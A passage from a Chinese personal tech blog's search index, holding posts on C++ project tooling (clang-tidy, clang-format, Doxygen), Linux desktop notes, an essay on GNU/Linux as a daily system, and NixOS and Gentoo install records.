set(TEST_TARGET_NAME main_test) set(TEST_SOURCE_FILES main_test.cpp ) add_executable(${TEST_TARGET_NAME} ","date":"2024-05-12","objectID":"/posts/cmake_intro/:1:0","tags":["Cpp notes","intro","CMake"],"title":"C++ 项目编写初步入门","uri":"/posts/cmake_intro/"},{"categories":["Cpp"],"content":"clang-tidy 和 clang-format clang-tidy is a clang-based C++ “linter” tool. Its purpose is to provide an extensible framework for diagnosing and fixing typical programming errors, like style violations, interface misuse, or bugs that can be deduced via static analysis. clang-tidy is modular and provides a convenient interface for writing new checks. clang-tidy 是一个基于 clang 的 C++ “linter” 工具。其目的是提供一个可扩展的框架，用于诊断和修复典型的编程错误，例如样式违规、接口误用或可以通过静态分析推断出的错误。 clang-tidy 是模块化的，并提供了一个方便的接口来编写新的检查。 clang-tidy 是一个静态语法扫描器。我第一次听说它就是在一个文章中，那篇文章介绍了 C++ 目前面临的困境，其中一个就是 C++ 的学习者还在对着已经过时的语法学习，根本不怎么了解 “modern cpp”。之后那篇文章介绍 clang-tidy 一定程度上正在解决这个问题，我对它的理解就是会检查源文件的语法是否符合 clang-tidy 认为的好写法，它根据多种规则来检查。但是 clang-tidy 内置的部分规则是没有必要的，比如要求类的成员函数的首字母需要大写（至少我认为没什么必要，甚至我写函数就没有大写的习惯，宏写的函数除外，不过宏写的到底能不能叫函数🤔）。 clang-tidy 支持项目根目录下存在一个 .clang-tidy 文件，该文件可以指定规则，检查的范围，对一些规则作具体的设置。 clang-format 就是一个专门的代码格式化工具了，clang-format 内置了多种代码风格，可以指定某个风格并做一些额外的修改，当然也是写在项目的根目录下的 .clang-format。 下面是我 .clang-tidy 文件的内容： Checks: ' bugprone-*, clang-analyzer-*, google-*, modernize-*, performance-*, portability-*, readability-*, -bugprone-easily-swappable-parameters, -bugprone-implicit-widening-of-multiplication-result, -bugprone-narrowing-conversions, -bugprone-reserved-identifier, -bugprone-signed-char-misuse, -bugprone-suspicious-include, -bugprone-unhandled-self-assignment, -clang-analyzer-cplusplus.NewDelete, -clang-analyzer-cplusplus.NewDeleteLeaks, -clang-analyzer-security.insecureAPI.rand, -clang-diagnostic-implicit-int-float-conversion, -google-readability-avoid-underscore-in-googletest-name, -modernize-avoid-c-arrays, -modernize-use-nodiscard, -readability-convert-member-functions-to-static, -readability-identifier-length, -readability-function-cognitive-complexity, -readability-magic-numbers, -readability-make-member-function-const, -readability-qualified-auto, -readability-identifier-naming, -readability-redundant-access-specifiers, -bugprone-exception-escape, -performance-avoid-endl, -readability-use-anyofallof, ' CheckOptions: - { key: readability-identifier-naming.ClassCase, value: CamelCase } - { key: readability-identifier-naming.EnumCase, value: CamelCase } - { key: readability-identifier-naming.FunctionCase, value: CamelCase } - { key: readability-identifier-naming.GlobalConstantCase, value: UPPER_CASE } - { key: readability-identifier-naming.MemberCase, value: lower_case } - { key: readability-identifier-naming.MemberSuffix, value: _ } - { key: readability-identifier-naming.NamespaceCase, value: lower_case } - { key: readability-identifier-naming.StructCase, value: CamelCase } - { key: readability-identifier-naming.UnionCase, value: CamelCase } - { key: readability-identifier-naming.VariableCase, value: lower_case } WarningsAsErrors: '*' HeaderFilterRegex: '/(src|test)/include' AnalyzeTemporaryDtors: true 下面则是 .clang-format 的内容 BasedOnStyle: Google ColumnLimit: 80 我对代码格式化还没有什么太高的需求，等我以后再好好研究如何更好的格式化吧。 ","date":"2024-05-12","objectID":"/posts/cmake_intro/:2:0","tags":["Cpp notes","intro","CMake"],"title":"C++ 项目编写初步入门","uri":"/posts/cmake_intro/"},{"categories":["Cpp"],"content":"doxygen 使用 doxygen 是一个根据源文件的注释生成项目 API 文档的软件。我认为一定程度上这逼迫者我写注释😶‍🌫️。这个文档格式可以是 HTML，LaTeX，man pages 等， doxygen 是根据 Doxyfile 生成相关文档的。在项目的根目录下打开终端输入 doxygen -g 即可产生一份带有注释信息的 Doxyfile，可以根据注释了解一下 Doxyfile 的写法。 下面是我 Doxyfile 的内容： PROJECT_NAME = \"ReleaseButler\" PROJECT_NUMBER = \"1.0\" PROJECT_BRIEF = \"😙 package manager on GitHub 😙\" # Project section # BRIEF_MEMBER_DESC = NO HTML_STYLESHEET = doc/doxygen-awesome-css/doxygen-awesome.css # 输入 INPUT = src README.md README_ZH_CN.md FILE_PATTERNS = *.cpp *.h RECURSIVE = YES # 输出格式 GENERATE_HTML = YES HTML_OUTPUT = doc/html GENERATE_LATEX = NO GENERATE_XML = NO GENERATE_RTF = NO GENERATE_MAN = YES MAN_OUTPUT = doc/man # 文档风格 OUTPUT_LANGUAGE = English # 文档内容 EXTRACT_ALL = YES # 注释风格 JAVADOC_AUTOBRIEF = YES QT_AUTOBRIEF = NO # 其他 GENERATE_TREEVIEW = YES GENERATE_LATEX = NO GENERATE_HTMLHELP = NO DISTRIBUTE_GROUP_DOC = NO USE_MDFILE_AS_MAINPAGE = README.md doxygen 生成的 HTML 网页好难看啊😢，所以我特地找了一个主题 doxygen-awesome-css，这样还能相对好看一些。 doxygen 对注释格式也有些要求，这是我写的一个注释： /** * @brief Simple encapsulation of std::getenv * * @param name Name of the environment variable * @return The value of the environment variable */ [[nodiscard]] auto get_env2str(std::string_view name) -\u003e std::string; @brief 是简要说明，@param 是参数说明，@return 是对返回值的说明。其实还有 @note 等字段，也可以用来标示一种信息。 而且实际上 clangd 目前不支持对 Doxygen 这样格式的注释的解析，导致 Visual Studio Code 读自己写的注释是没有什么好渲染的。 不过貌似微软官方的 C/C++ 插件可以解析 Doxygen 的注释，并渲染出来，但我习惯使用 clangd 了。 ","date":"2024-05-12","objectID":"/posts/cmake_intro/:3:0","tags":["Cpp notes","intro","CMake"],"title":"C++ 项目编写初步入门","uri":"/posts/cmake_intro/"},{"categories":null,"content":"这是我日常生活的部分吐槽，由于内容分散而且不足以聚合成一个文章，故而在这里写","date":"2024-04-13","objectID":"/posts/notes/","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"这是我日常生活的部分吐槽，由于内容分散而且不足以聚合成一个文章，故而在这里写 ","date":"2024-04-13","objectID":"/posts/notes/:0:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"对双系统蓝牙的使用的吐槽 这个鬼蓝牙键盘居然会记蓝牙设备的地址 🐴，我这个双系统还特地去 Windows 偷了一下连接这个键盘产生的密钥，替换了 Linux 这里的密钥才成功做到两个系统都可以连。而且 /var/lib/bluetooth/ 这个路径普通用户还读不进去。 破案了，我感觉所有蓝牙设备都会这么干，我的耳机也得偷一遍密钥才行。 ","date":"2024-04-13","objectID":"/posts/notes/:1:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"对 Chromium 的吐槽，以及安装 Fedora Linux 的感慨 我真的很烦这个 B Chromium 对 Waylnad 和硬件视频加速支持这么难绷这一点。 在 Fedora 上切换到 KDE Plasma 了，真的很舒服（除了颜值我还是认为不如 GNOME 之外）。总的来说是主要是以下几点让我认为很舒服： XWayland 的缩放看起来略显正常 支持的 Wayland 输入法协议多，使用 Chromium 内核的软件可以很好的在 Wayland 下输入中文。 kate 很好用 ","date":"2024-04-13","objectID":"/posts/notes/:2:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"关于中英文排版的感受 刚刚发现汉字中间包着 *xx* 这样的 markdown 没有被翻译成斜体，难道汉字和英文字母中间隔一个空格还是一个蛮正确的选择？ 现在我认为就应该是中文和英文之间空一格，这样看着也舒服。 ","date":"2024-04-13","objectID":"/posts/notes/:3:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"关于 KDE Plasma 6 的初步感受 KDE Plasma 6 对 Wayland 的支持感觉比 Plasma5 要好很多。不过现在使用 NixOS 时，Plasma 6 还有点小问题，但总体上比 Plasma5 强很多。这建立在我倾向于使用 nvidia-driver 的情况下，也许使用 mesa 本来就会更好 NVIDIA 对 XWayland 的支持还是还是有些难绷，我还是尽量不使用不支持 Wayland 的应用吧（比如使用较老版本 Electorn 编译的软件）。 ","date":"2024-04-13","objectID":"/posts/notes/:4:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"我这个老家伙的观念不太适合 NixOS 虽然 NixOS 的理念让用户在一定程度上不需要太担心系统挂掉，然后需要启动 liveusb chroot 进去修补的问题（毕竟存在一个类似快照的机制，不过不是文件系统层面的，所以也不能说完全不需要担心）。但有时候我一时间我的第一反应还是 chroot 进去修补，难绷。 ","date":"2024-04-13","objectID":"/posts/notes/:5:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"NVIDIA 即将支持 XWaylnad 显示同步 NVIDIA 关于 XWayland 的 GPU 显示同步补丁已经在 Xorg, Mutter 和 KWin 中都已合并。 这里是 KDE 的一位开发者 Xaver Hugl 关于显示同步的解释：Explicit sync | Xaver’s blog。 根据 egl-wayland 上的讨论，这需要等到 nvidia-driver 555 版本 但是后续该开发者自称移植到 555 版本已经有点晚了，所以需要等到 560 版本的 nvidia-driver。 目前在我看来应该是分两步。第一步是 WM 要支持这个功能，现在 KWin 和 Mutter 都合并了相关补丁，KDE Plasma 6.1 貌似就发布合并了这个补丁的 KWin 了，我不清楚 GNOME 是哪个版本号，可能是 46 的某个小版本吧（猜测）。第二步是本机安装的 nvidia-driver 是支持这个的（目前看来也就是 560 版本以及上了）。 不过这个开发者的评论还是有一点道理的: Are there really that many native Wayland Vulkan applications out there right now? I didn’t think there were. Of course, that will definitely change in the future, especially when Wine switches to using Wayland. – https://github.com/NVIDIA/egl-wayland/pull/104#issuecomment-2073649862 所以 wine 还不支持 Wayland 🐴，我没有用 wine，我还真不知道 根据 phoronix 的一篇文章介绍，NVIDIA 555.42.02 Beta 驱动已经发布了，这个就已经带有了 Wayland 显示同步的支持，莫非这个其实还真的是 555 stable 版本能有的功能？ 不管如何，本身的桌面管理器的还得支持才行，KDE Plasma 已经发布了 6.0 的最后一个版本，没有一刻为 6.0.5 而感叹，接下来赶到我电脑上的就是带有 Wayland 显示同步支持的 6.1 ✌️。 ","date":"2024-04-13","objectID":"/posts/notes/:6:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"对 arch-install 的评价 今天安装了 Arch Linux + KDE Plasma，这回我使用 archinstall 安装，感觉还不错。不得不说，AUR 软件是真多，我很多软件什么的都可以找到，直接用 paru 安装就行。而且我发现 NVIDIA + XWayland 好像没有那么难绷了。不过还是等到 nvidia-driver 到 555 版本以及 KDE Plasma 6.1 的吧。 ","date":"2024-04-13","objectID":"/posts/notes/:7:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"NVIDIA + XWayland 的吐槽 NVIDIA + XWayland 还是很难绷，还是等到 nvidia-driver stable 更新到 555 的吧。 ","date":"2024-04-13","objectID":"/posts/notes/:8:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"zed stable for Linux 已发布 zed stable for linux 已经发布，可以根据 zed docs 上提供的办法下载安装。 我本身不是 Rust 开发者，所以就试着打开了我 C++ 的小项目，总体来说还是不错的，有我看得下去的主题，内置 clangd 的支持，不过貌似没有对 clang-tidy 和 clang-format 的支持，如果还能有对 CMake 的支持就更好了。 ","date":"2024-04-13","objectID":"/posts/notes/:9:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"菜狗对 glibc 的感慨 我一开始想写吐槽，后来感觉吐槽不太好。 起因是我出于某个原因，想去看一下 glibc 对 fputc() 的实现，fputc 函数本身写的不长，毕竟光调用别的宏了，我就不断的跳，直到跳到了这里: int __overflow (FILE *f, int ch) { /* This is a single-byte stream. */ if (f-\u003e_mode == 0) _IO_fwide (f, -1); return _IO_OVERFLOW (f, ch); } _IO_OVERFLOW 也是一个宏函数，它完全展开长这个样子: ((IO_validate_vtable ((*(__typeof__ (((struct _IO_FILE_plus){}).vtable) *) (((char *) ((f))) + __builtin_offsetof (struct _IO_FILE_plus, vtable))))) -\u003e__overflow) (f, ch) 虽然最后了解了一下貌似是为了检查这个 vtable 合不合理用的，但还是感慨，第一次看到这样的宏展开。 ","date":"2024-04-13","objectID":"/posts/notes/:10:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"从 AstroPaper 换到了 hugo 由于每次 npm install 后都会输出一些依赖组件不被支持的 log，我就换到了 Hugo 生成我的博客。 ","date":"2024-04-13","objectID":"/posts/notes/:11:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"pandoc 将 Markdown 转成 PDF 我希望找到一个我较为喜欢的方式将 Markdown 转成 PDF，我目前使用中，其实曾经用的 Typora 的效果感觉还好，不过我希望用一个偏 free 一些的软件，于是选择使用了 pandoc。 使用下边的这个命令就可以转了 $ pandoc test.md -o test.pdf --pdf-engine xelatex -V CJKmainfont=\"Noto Sans CJK SC\" -V mainfont=\"Noto Sans Mono\" xelatex 需要相关的 Tex Live 包。 ","date":"2024-04-13","objectID":"/posts/notes/:12:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":null,"content":"尝试了安全启动的 Gentoo Linux 终于，家人们，我用上了安全启动 + 硬盘加密的 Gentoo Linux 下一步就是不使用 gentoo-kernel，使用 gentoo-source 编译内核（为了 CFI） ","date":"2024-04-13","objectID":"/posts/notes/:13:0","tags":["others"],"title":"随笔记","uri":"/posts/notes/"},{"categories":["Linux_杂谈"],"content":"一个简单的评价文章，关于是否应该选择使用 GNU/Linux 作为你的个人日用桌面操作系统","date":"2024-04-13","objectID":"/posts/whywinorlinux/","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统 2025 05 02 更新: 删除了一些不合适的评价，修改了一些语句不通顺的地方 本章关于使用 GNU/Linux 作为个人日用桌面操作系统做了一些评价，主要是从是否应该使用两方面来评价。 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:0:0","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"为什么不应该使用 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:1:0","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"从应用软件的层面来看 直到 2023 年初，腾讯才正式推出 Linux 版本的 QQ，并且开发进度落后于 Windows 和 Mac 端，不过几乎所有发行版都可以使用，不过还会存在一些小 BUG。 直到 2024 年 3 月，腾讯才正式推出 Linux 版本的微信，大致上的该有的功能基本都有，但是原生只能安装在部分国产操作系统上。如果使用的是其他的 Linux 发行版，可以使用 bwrap 套一层绕过检测。 直到 2024 年 10 月，腾讯才推出可以在其他发行版上使用的微信。 网易云音乐已经不再分发官方的 Linux 版本的软件包了，如果需要使用可以选择安装其他的第三方网易云音乐客户端。 Microsoft office 365 没有 Linux 的版本，目前要么用 WPS。要么用 onlyoffice。很多 Linux 用户貌似会用 libreoffice？ 只有部分游戏是提供了原生的 Linux 版本（其中有一部分大概是因为 Steam Deck，Steam Deck 上的操作系统 Steam OS 是一个 GNU/Linux 发行版）。不过 Valve 公司开发了 Proton 兼容层以运行只支持 Windows 的游戏。 很多专业的软件可能处于没有 Linux 版本的状态。我又不是任何领域的专业人士，这个还是需要自己去搜集。如果是计算机相关还是有很多平替的，可以参考网站 AlternativeTo，这个网站列出了一些软件的替代品可供参考。 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:1:1","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"从硬件的层面来看 芯片厂商对于 Linux 的支持总是落后于 Windows 的。 对于硬件视频加速来说，Firefox 的支持还可以，Chromium 只是实验性支持（不过貌似也可以用）。这里 Intel 和 AMD 都会使用 VAAPI，NVIDIA 开发了一套 VDPAU 和 NVDEC。不过貌似 VDPAU 的 driver 好久不开发了，NVIDIA 可以安装 nvidia-vaapi-driver，这样可以将 NVDEC 转成 VAAPI 供 Firefox 使用。虽然 nvidia-vaapi-driver 只支持解码，不支持编码，但视频播放器，录屏软件都支持 NVIDIA 原有的编解码格式，所以也还好。 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:1:2","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"从安全的角度来看 这个其实不好说，从开源的角度来说，可以审查理论上下限不会太低，但是xz 的投毒事件也可以看出这个安全性也么那么绝对 今天有人提到 Lasse Collin 对于 xz 项目早就疲惫不堪，Jia Tan 是极少数愿意真正贡献代码的“开发者”，这都是这场悲剧不可或缺的背景条件。 在无人关心的角落，Florian Westphal 最近辞去了内核 netfilter co-maintainer，所以现在 nf 只剩 Pablo Neira Ayuso 一人维护。这可是无数人每天使用的 netfilter。 在无人关心的角落，我最爱的工具之一 strace 依然只由一个捷克人 Dmitry V. Levin 默默维护。 在无人关心的角落，tcpdump/libpcap 在由 the-tcpdump-group 持续更新，其中一位 Denis Ovsienko 的自我介绍是 sometimes I work jobs for living, sometimes I contribute pro bono to free and open source software projects, often I do both，给人一种很孤独的感觉。 在无人关心的角落，bash group 只有三位 active members，其中一位 Bob Proulx 有个古典博客，里面有记录他和妻子的平静生活。 我以前赞美人月神话，但我现在更关心默默无闻的开发者们，就像 vim 作者 Bram Moolenaar 一生没有和任何人建立亲密关系，我只想问，你这一生过得开心吗？ 上面这段话转自知乎的一个回答 基础开源软件组件有些是几个人的为爱发电。但基础组件一旦出现了安全问题，影响还是挺大的。 从安全角度来讲， 你不应该使用原版的 linux-kernel，而是 linux-hardened 这样的 kernel 使用了基本内核加固补丁集和更多安全相关的编译时配置选项 还应该使用 sysctl 更加细粒度的调整一些安全相关的参数 或者至少应该自己编译内核，删除不必要的 module，选择更安全的内核编译选项。 不应该使用 pulseaudio 这个音频服务，而是使用 pipewire 这一点还好，现在应该都在使用 pipewire 应该使用 SELinux 或者 AppArmor 这样的软件更细致的管控文件权限 flatpak 安装的软件，应该使用 flatseal 用于管理软件的权限 使用 sudo 应该只允许用户执行部分软件而不是直接允许执行全部软件 硬盘/文件系统应该加密 grub 这个 bootloader 也应该加密，BIOS 也应该加密 一些文件目录挂载的时候可以禁用读写权限或者执行权限之类的 应该尝试使用 firejail 或者 bwrap 这样的沙盒程序 bwrap 貌似比 firejail 更好一些 不应该使用 Xorg，应该使用 Wayland 这一点还好，现在大部分的桌面环境都带有 Wayland 的支持，最新版本的 KDE Plasma 和 GNOME 甚至默认就是 Wayland 会话 这里还存在一个问题是——是否要选择 使用源码分发的包管理器 的发行版。 这种发行版的软件分发的是其源代码，软件的编译工作是跑在用户的机器上这样的好处是可以控制软件的功能的选择，软件的体积减小，攻击面理论上也会少一些。并且由于编译是跑在用户自己的机器上，你可以开很多为了安全考虑的编译选项。甚至编译工具链也可以选择。 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:1:3","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"为什么应该使用 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:2:0","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"从应用软件的角度来看 我认为，终端通过 shell 将系统的细节暴露给用户，使得用户可以做很多事情。尤其 Linux 更大限度的暴露细节。 Richard Stallman 因为认为当时黑客文化式微，发起了 GNU 项目，组织了自由软件基金会并发起了自由软件运动。 我认为这一定程度上影响了一批人，导致开发者会用开源软件并回馈开源社区。 当然这样的大牛不止这一位，比如 Linus Torvalds 技术很强，但是还没有 Richard Stallman 的观点那么偏激（这句话不代表我认为 Richard Stallman 的观点偏激，我只是用偏激作为对比的词汇），Linus Torvalds 也吸引了很多 hacker。 一定程度上，由于开发者目前使用的很多软件都是开源的，开源软件目前互相之间的配合还是可以的，所以作为同样是开源软件的 linux，它们之间的工作会更加顺畅。我认为这一定程度上也算是形成了一个圈子🤪。 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:2:1","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"从安全的角度来讲 单纯从批判商业公司闭源软件可能有自留后门的角度来说，开源软件这样的风险少一些（我并不是说开源软件一定不会有风险）。 我目前认为只有上述这个角度能说明使用 GNU/Linux 作为日用操作系统会比使用诸如 Windows 更加安全了，还有就是可能 Linux 会有一些更加强劲的安全权限控制软件。 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:2:2","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"结论 目前应该还是更适合编程开发。 应用程序角度来看，目前 GNU/Linux 最友好的桌面环境应该是 KDE Plasma。目前国内软件大部分都可以在 Linux 找到官方分发的软件包，就算没有也有非官方的开源实现。部分软件没有 Linux 的版本，也许会有替代品，但效果可能会差一些。 硬件上来看，NVIDIA 显卡的支持目前还是不错，不过还是有些小毛病，其他的芯片我不太了解，应该都还好。 安全性还说，默认的还是不行，用户还是需要一定的自设定。我一直认为，如果真的追求安全性，应该装 QubesOS 这个操作系统。 ","date":"2024-04-13","objectID":"/posts/whywinorlinux/:3:0","tags":["Linux","intro"],"title":"为什么你应该(不)使用 GNU/Linux 作为日用操作系统","uri":"/posts/whywinorlinux/"},{"categories":["Linux_杂谈"],"content":"我这次安装 NixOS 做的额外的工作，也就是除官方文档之外的安装步骤。这里我用 WM 用的是 Hyprland","date":"2024-04-06","objectID":"/posts/nixos_install_rec/","tags":["NixOS","Linux","intro"],"title":"我的 NixOS 安装记录","uri":"/posts/nixos_install_rec/"},{"categories":["Linux_杂谈"],"content":"我这次安装 NixOS 做的额外的工作，也就是除官方文档之外的安装步骤。这里我用 WM 用的是 Hyprland 我的 NixOS 安装记录 ","date":"2024-04-06","objectID":"/posts/nixos_install_rec/:0:0","tags":["NixOS","Linux","intro"],"title":"我的 NixOS 安装记录","uri":"/posts/nixos_install_rec/"},{"categories":["Linux_杂谈"],"content":"背景 在上个月，我还在使用着 Gentoo Linux，那时我还在想应该可以一直使用下去，结果后来有个组件需要用到 systemd，于是我准备从 openrc 换到 systemd，同时因为 pipewire 也很依赖 systemd，我用 openrc 的同时用 pipewire 总有一点不太得劲。但是我的环境也许有些独特了，或者是我自身实力不够，反正我无法以一种较为优雅的方式从 openrc 换到 systemd。 后来我就想到了 NixOS，曾经我被它那些新鲜的特性搞得不知道从何下手（虽然现在我也不太能下手）。 ","date":"2024-04-06","objectID":"/posts/nixos_install_rec/:1:0","tags":["NixOS","Linux","intro"],"title":"我的 NixOS 安装记录","uri":"/posts/nixos_install_rec/"},{"categories":["Linux_杂谈"],"content":"关于 UEFI 我不好评价为什么我改成 grub 之后，grub-install 根本没有写入，我改回了 systemd-boot 就行了。后来我在搜相关问题的时候发现有人指出需要这个设置： boot.loader.efi.canTouchEfiVariables = true; 由于我这个电脑现在是 Windows 11 + NixOS，所以我需要使用 grub 才可以 boot.loader.efi.canTouchEfiVariables = true; boot.loader = { systemd-boot.enable = false; grub = { enable = true; device = \"nodev\"; efiSupport = true; useOSProber = true; }; }; Hyprland 默认就是 Wayland，但是对于一些尚未完全准备充分的（比如 Chromium 内核的软件）软件需要加 environment.sessionVariables.NIXOS_OZONE_WL = \"1\";。但是对于老版本的 Electorn 应用来说，哪怕这个环境变量启用了也于事无补。 众所周知，Chromium 目前启用了 Wayland 之后就需要附加命令行参数的方式才能正常使用输入法。目前我只使用了 Brave 和 vscodium 需要这一点。 home.packages = with pkgs;[ ( (brave.override { commandLineArgs = [ \"--enable-wayland-ime\" \"--ozone-platform=wayland\" \"--enable-features=UseOzonePlatform\" # \"--use-gl=egl\" ]; }).overrideAttrs (old: { # inherit (pkgs.guangtao-sources.brave) src pname version; }) ) ]; programs.vscode = { enable = true; enableExtensionUpdateCheck = false; enableUpdateCheck = false; extensions = with pkgs.vscode-extensions; [ yzhang.markdown-all-in-one pkief.material-icon-theme llvm-vs-code-extensions.vscode-clangd vadimcn.vscode-lldb usernamehw.errorlens astro-build.astro-vscode ]; userSettings = { \"window.titleBarStyle\" = \"custom\"; \"editor.fontFamily\" = \"Intel One Mono\"; \"editor.fontSize\" = 17; \"telemetry.telemetryLevel\" = \"off\"; \"workbench.iconTheme\" = \"material-icon-theme\"; \"workbench.colorTheme\" = \"Quiet Light\"; }; package = (pkgs.vscodium.override { commandLineArgs = [ \"--ozone-platform-hint=auto\" \"--ozone-platform=wayland\" \"--enable-wayland-ime\" ]; }); }; 这里可以看到使用的是 vscode，而不是 vscodium，因为 vscodium 还没有这些配置选项，所以就用 vscode，替换掉 vscode 的 package 这样用了。 我将我自己在使用 NixOS 时的 configuration.nix 等文件上传到了 GitHub 仓库中: https://github.com/suoyuan666/NixOS_configfiles ","date":"2024-04-06","objectID":"/posts/nixos_install_rec/:2:0","tags":["NixOS","Linux","intro"],"title":"我的 NixOS 安装记录","uri":"/posts/nixos_install_rec/"},{"categories":["Linux_杂谈"],"content":"我这次安装 Gentoo Linux 做的额外的工作，也就是除官方文档之外的安装步骤。这里我用的 init 是 openrc，WM 用的是 Hyprland","date":"2024-03-28","objectID":"/posts/gentooinstall_ng/","tags":["Gentoo Linux","Linux","intro"],"title":"我写的 Gentoo Linux 安装指南","uri":"/posts/gentooinstall_ng/"},{"categories":["Linux_杂谈"],"content":"我这次安装 Gentoo Linux 做的额外的工作，也就是除官方文档之外的安装步骤。这里我用的 init 是 openrc，WM 用的是 Hyprland 我写的 Gentoo Linux 安装指南 ","date":"2024-03-28","objectID":"/posts/gentooinstall_ng/:0:0","tags":["Gentoo Linux","Linux","intro"],"title":"我写的 Gentoo Linux 安装指南","uri":"/posts/gentooinstall_ng/"},{"categories":["Linux_杂谈"],"content":"背景 我这次安装主要因为 Gentoo Linux 在我看来真的很有趣，并且我想尝试一些新的东西试试，虽然我用 Arch Linux 应该不会遇到滚挂的问题，但我还是有些疑虑。 我在安装前的预计其实是用 Gentoo Linux，同时 init 使用 openrc，默认编译工具链用 clang/llvm，用 hardened profile 并且开一些额外的编译选项（比如 thinlto 之类的）。不过目前只实现了使用 openrc 和 hardened profile。 ","date":"2024-03-28","objectID":"/posts/gentooinstall_ng/:1:0","tags":["Gentoo Linux","Linux","intro"],"title":"我写的 Gentoo Linux 安装指南","uri":"/posts/gentooinstall_ng/"},{"categories":["Linux_杂谈"],"content":"profile 选择 根据 Gentoo Linux 在 24 年 3 月发布的 news，profile 17.1 等版本已经过时了，最好应该更新到 23.0。如果你的 stage3 包下载的是 systemd 什么的，那就直接 enable 23.0 的 profile，如果你上来就选择了 openrc 相关的 profile，貌似还是 17.1 的。你需要更换到对应 23.0 中的那些 split-usr 的 profile。 $ eselect profile list | grep 23.0 [21] default/linux/amd64/23.0 (stable) [22] default/linux/amd64/23.0/systemd (stable) [23] default/linux/amd64/23.0/desktop (stable) [24] default/linux/amd64/23.0/desktop/systemd (stable) [25] default/linux/amd64/23.0/desktop/gnome (stable) [26] default/linux/amd64/23.0/desktop/gnome/systemd (stable) [27] default/linux/amd64/23.0/desktop/plasma (stable) [28] default/linux/amd64/23.0/desktop/plasma/systemd (stable) [29] default/linux/amd64/23.0/no-multilib (stable) [30] default/linux/amd64/23.0/no-multilib/systemd (stable) [31] default/linux/amd64/23.0/no-multilib/hardened (stable) [32] default/linux/amd64/23.0/no-multilib/hardened/systemd (stable) [33] default/linux/amd64/23.0/no-multilib/hardened/selinux (stable) [34] default/linux/amd64/23.0/no-multilib/hardened/selinux/systemd (stable) [35] default/linux/amd64/23.0/no-multilib/prefix (exp) [36] default/linux/amd64/23.0/no-multilib/prefix/kernel-2.6.32+ (exp) [37] default/linux/amd64/23.0/no-multilib/prefix/kernel-2.6.16+ (exp) [38] default/linux/amd64/23.0/no-multilib/prefix/kernel-3.2+ (exp) [39] default/linux/amd64/23.0/llvm (stable) [40] default/linux/amd64/23.0/llvm/systemd (stable) [41] default/linux/amd64/23.0/hardened (stable) [42] default/linux/amd64/23.0/hardened/systemd (stable) [43] default/linux/amd64/23.0/hardened/selinux (stable) [44] default/linux/amd64/23.0/hardened/selinux/systemd (stable) [45] default/linux/amd64/23.0/split-usr (stable) [46] default/linux/amd64/23.0/split-usr/desktop (stable) [47] default/linux/amd64/23.0/split-usr/desktop/gnome (stable) [48] default/linux/amd64/23.0/split-usr/desktop/plasma (stable) [49] default/linux/amd64/23.0/split-usr/no-multilib (stable) [50] default/linux/amd64/23.0/split-usr/no-multilib/selinux (stable) [51] default/linux/amd64/23.0/split-usr/no-multilib/hardened (stable) [52] default/linux/amd64/23.0/split-usr/no-multilib/hardened/selinux (stable) [53] default/linux/amd64/23.0/split-usr/no-multilib/prefix (exp) [54] default/linux/amd64/23.0/split-usr/no-multilib/prefix/kernel-2.6.32+ (exp) [55] default/linux/amd64/23.0/split-usr/no-multilib/prefix/kernel-2.6.16+ (exp) [56] default/linux/amd64/23.0/split-usr/no-multilib/prefix/kernel-3.2+ (exp) [57] default/linux/amd64/23.0/split-usr/llvm (stable) [58] default/linux/amd64/23.0/split-usr/hardened (stable) [59] default/linux/amd64/23.0/split-usr/hardened/selinux (stable) [62] default/linux/amd64/23.0/x32 (dev) [63] default/linux/amd64/23.0/x32/systemd 